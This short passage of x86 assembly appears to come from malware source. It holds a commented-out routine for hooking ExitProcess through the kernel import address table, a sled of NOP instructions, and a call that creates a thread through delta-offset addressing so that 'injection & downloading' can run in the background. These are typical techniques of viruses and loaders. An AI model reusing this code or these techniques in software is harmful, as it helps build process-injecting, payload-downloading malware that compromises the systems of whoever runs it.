; Hook ExitProcess
hookExitProcess:
; mov eax, KernelIAT RVA Addr
; mov ecx, BaseAddress + Offset ExitProcess
; mov eax, [eax] ; Kernel IAT VA
; add ecx, eax ; Kernel IAT ExitProcess
; mov eax, [ecx] ; Addr ExitProcess
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

; Create Thread to avoid waiting injection & downloading
PDELTA	ThreadId
push	0
push	ebp
PDELTA	threadProgram
push	0
push	0
call	[DELTA pCreateThread]

